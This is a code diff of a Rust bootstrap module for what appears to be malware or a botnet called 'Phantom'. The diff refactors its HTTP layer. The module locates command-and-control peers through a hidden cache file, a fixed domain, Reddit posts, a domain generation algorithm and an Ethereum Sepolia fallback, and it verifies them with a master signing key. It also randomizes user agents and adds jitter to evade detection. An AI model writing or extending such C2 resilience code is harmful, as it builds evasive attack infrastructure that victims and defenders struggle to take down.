@@ -3,7 +3,6 @@ pub mod dga;
 pub mod reddit;
 pub mod blockchain;
 
-use reqwest::Client;
 use std::error::Error;
 use std::time::Duration;
 use std::sync::Arc;
@@ -11,7 +10,6 @@ use log::{info, debug, warn};
 use base64::{Engine as _, engine::general_purpose};
 use ed25519_dalek::{Verifier, VerifyingKey, Signature};
 use rand::Rng;
-use tokio::task::JoinSet;
 
 // Re-export providers for easier access if necessary
 pub use doh::{DohProvider, HttpProvider};
@@ -28,36 +26,31 @@ const MASTER_PUB_KEY: [u8; 32] = [
     0xe7, 0x38, 0x99, 0xcc, 0x79, 0x3d, 0xb8, 0x6a
 ];
 
-#[async_trait::async_trait]
+/// Bootstrap provider trait (synchronous - runs in blocking thread)
 pub trait BootstrapProvider: Send + Sync {
-    async fn fetch_payload(&self, client: &Client) -> Result<String, Box<dyn Error + Send + Sync>>;
+    fn fetch_payload(&self) -> Result<String, Box<dyn Error + Send + Sync>>;
     fn name(&self) -> String;
 }
 
 pub struct ProfessionalBootstrapper {
-    primary_providers: Vec<Arc<dyn BootstrapProvider>>, // Tier 1: dht.polydevs.uk
-    fallback_providers: Vec<Arc<dyn BootstrapProvider>>, // Tier 2: DGA
-    client: Client,
+    primary_providers: Vec<Arc<dyn BootstrapProvider>>,
+    fallback_providers: Vec<Arc<dyn BootstrapProvider>>,
+    user_agent: String,
 }
 
 impl ProfessionalBootstrapper {
     pub fn new() -> Self {
         let user_agents = vec![
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
             "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
         ];
-        let ua = user_agents[rand::thread_rng().gen_range(0..user_agents.len())];
+        let ua = user_agents[rand::thread_rng().gen_range(0..user_agents.len())].to_string();
         
-        // Default Configuration
         let mut bs = Self {
             primary_providers: Vec::new(),
             fallback_providers: Vec::new(),
-            client: Client::builder()
-                .timeout(Duration::from_secs(CONNECT_TIMEOUT_SEC))
-                .user_agent(ua)
-                .build()
-                .unwrap(),
+            user_agent: ua,
         };
 
         // 1. Primary: dht.polydevs.uk
@@ -78,29 +71,34 @@ impl ProfessionalBootstrapper {
         self.primary_providers.push(provider);
     }
     
+    /// Race providers in a tier - returns first successful result
     async fn race_tier(&self, tier: &[Arc<dyn BootstrapProvider>]) -> Option<Vec<(String, u16)>> {
         if tier.is_empty() { return None; }
         
-        let mut set = JoinSet::new();
+        // Run all providers concurrently using smol::unblock for blocking I/O
+        let mut handles = Vec::new();
         for provider in tier {
-             let p = provider.clone();
-             let c = self.client.clone();
-             set.spawn(async move {
-                 // Jitter: Sleep 0-2s to avoid simultaneous packets
-                 let jitter = rand::thread_rng().gen_range(0..2000);
-                 tokio::time::sleep(Duration::from_millis(jitter)).await;
-                 match p.fetch_payload(&c).await {
-                    Ok(payload) => verify_signature(&payload).map(|ips| (p.name(), ips)),
-                    Err(e) => Err(e),
-                 }
-             });
+            let p = provider.clone();
+            handles.push(smol::spawn(async move {
+                // Run blocking HTTP in thread pool
+                smol::unblock(move || {
+                    // Add jitter
+                    std::thread::sleep(Duration::from_millis(
+                        rand::thread_rng().gen_range(0..1000)
+                    ));
+                    match p.fetch_payload() {
+                        Ok(payload) => verify_signature(&payload).map(|ips| (p.name(), ips)),
+                        Err(e) => Err(e),
+                    }
+                }).await
+            }));
         }
         
-        while let Some(res) = set.join_next().await {
-            match res {
-                Ok(Ok((source_name, peers))) => {
+        // Wait for first successful result
+        for handle in handles {
+            match handle.await {
+                Ok((source_name, peers)) => {
                     info!("[Bootstrap] SUCCESS via {}. Found {} peers.", source_name, peers.len());
-                    set.abort_all();
                     return Some(peers);
                 }
                 _ => {}
@@ -114,7 +112,7 @@ impl ProfessionalBootstrapper {
         let path = if cfg!(target_os = "windows") {
              "C:\\ProgramData\\Phantom\\nodes.cache"
         } else {
-             "/var/tmp/.phantom_nodes" // /var/tmp survives reboots
+             "/var/tmp/.phantom_nodes"
         };
 
         if let Ok(contents) = std::fs::read_to_string(path) {
@@ -132,15 +130,13 @@ impl ProfessionalBootstrapper {
         let path = if cfg!(target_os = "windows") {
              "C:\\ProgramData\\Phantom\\nodes.cache"
         } else {
-             "/var/tmp/.phantom_nodes" // /var/tmp survives reboots
+             "/var/tmp/.phantom_nodes"
         };
         
-        // Ensure parent directory exists
         if let Some(parent) = std::path::Path::new(path).parent() {
             let _ = std::fs::create_dir_all(parent);
         }
         
-        // Format: IP:Port;IP:Port;
         let mut content = String::new();
         for (ip, port) in peers {
             content.push_str(&format!("{}:{};", ip, port));
@@ -156,7 +152,7 @@ impl ProfessionalBootstrapper {
     pub async fn resolve(&self) -> Option<Vec<(String, u16)>> {
         info!("[Bootstrap] Starting Tiered Resolution.");
         
-        // Tier 0: Local Persistence (Old DHT)
+        // Tier 0: Local Persistence
         if let Some(nodes) = self.load_cache_peers() {
             return Some(nodes);
         }
@@ -167,7 +163,7 @@ impl ProfessionalBootstrapper {
             return Some(nodes);
         }
 
-        // Tier 2: Reddit (Tag Search) - Moved Priority ABOVE DGA
+        // Tier 2: Reddit
         info!("[Bootstrap] Tier 1 Failed. Attempting Tier 2 (Reddit)...");
         let reddit_provider: Arc<dyn BootstrapProvider> = Arc::new(RedditProvider);
         let reddit_tier = vec![reddit_provider];
@@ -175,13 +171,13 @@ impl ProfessionalBootstrapper {
              return Some(nodes);
         }
 
-        // Tier 3: Fallback (DGA) - High noise, lower priority
+        // Tier 3: Fallback (DGA)
         info!("[Bootstrap] Tier 2 Failed. Attempting Tier 3 (DGA)...");
         if let Some(nodes) = self.race_tier(&self.fallback_providers).await {
             return Some(nodes);
         }
 
-        // Tier 4: Blockchain (Last Resort)
+        // Tier 4: Blockchain
         info!("[Bootstrap] Tier 3 Failed. Attempting Tier 4 (Sepolia Blockchain)...");
         use crate::discovery::eth_listener;
         if let Some((nodes, _blob)) = eth_listener::check_sepolia_fallback().await {
